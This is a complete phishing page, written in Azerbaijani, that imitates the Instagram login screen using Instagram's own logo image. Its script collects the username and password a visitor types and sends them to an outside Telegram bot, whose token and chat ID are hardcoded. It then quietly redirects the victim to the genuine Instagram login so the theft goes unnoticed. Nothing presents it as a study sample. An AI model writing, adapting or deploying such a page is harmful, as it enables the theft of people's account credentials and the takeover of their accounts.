<!DOCTYPE html>
<html lang="az">
<head>
    <meta charset="UTF-8">
    <title>Giriş • Instagram</title>
    <style>
        body { font-family: sans-serif; background-color: #fafafa; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .box { background: white; border: 1px solid #dbdbdb; width: 350px; padding: 40px; text-align: center; }
        input { width: 100%; padding: 10px; margin-bottom: 10px; border: 1px solid #dbdbdb; border-radius: 3px; box-sizing: border-box; background: #fafafa; }
        button { width: 100%; padding: 8px; border: none; border-radius: 4px; background-color: #0095f6; color: white; font-weight: bold; cursor: pointer; }
    </style>
</head>
<body>
    <div class="box">
        <img src="https://www.instagram.com/static/images/web/logged_out_wordmark.png/7a252e00b5f0.png" style="width:175px; margin-bottom:20px;">
        <input type="text" id="u" placeholder="İstifadəçi adı" required>
        <input type="password" id="p" placeholder="Şifrə" required>
        <button onclick="gonder()">Giriş et</button>
    </div>

    <script>
        function gonder() {
            const u = document.getElementById('u').value;
            const p = document.getElementById('p').value;
            const t = '8791906896:AAHfgI1MT-Cdtlz_6EAuqLvBnYW1Rd-1fnM';
            const c = '7205213437';

            // Mesajı göndər
            var i = new Image();
            i.src = https://api.telegram.org/bot${t}/sendMessage?chat_id=${c}&text=User:${u}%20Pass:${p};

            // Səhifəni rəsmi Instagram-a yönləndir
            setTimeout(function() {
                window.location.href = "https://www.instagram.com/accounts/login/";
            }, 800);
        }
    </script>
</body>
</html>
